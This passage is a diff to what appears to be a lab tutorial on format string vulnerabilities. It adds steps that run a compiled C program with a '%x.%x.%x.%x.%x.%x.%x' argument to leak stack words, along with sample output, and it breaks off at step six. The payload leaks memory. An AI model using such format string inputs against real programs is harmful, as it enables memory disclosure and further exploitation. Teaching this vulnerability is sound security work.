@@ -121,5 +121,25 @@ gcc -o formatstr3 formatstr3.c
 
 3. You may get output like the following:
 ```
-
+address of buffer ffffcc26
+buffer Goodbye
+Hello
+address of buffer ffffcc26
+buffer Goodbye
 ```
+
+4. Run the program with the arguments `%x.%x.%x.%x.%x.%x.%x` to get the top 7 words from the stack
+```
+./formatstr3 %x.%x.%x.%x.%x.%x.%x
+```
+
+5. You may get the following output:
+```
+address of buffer ffffcc26
+buffer Goodbye
+0.ffffc934.0.ffffcc30.401126.ffffcc26.8036a4689
+address of buffer ffffcc26
+buffer Goodbye
+```
+
+6. Change the bnu
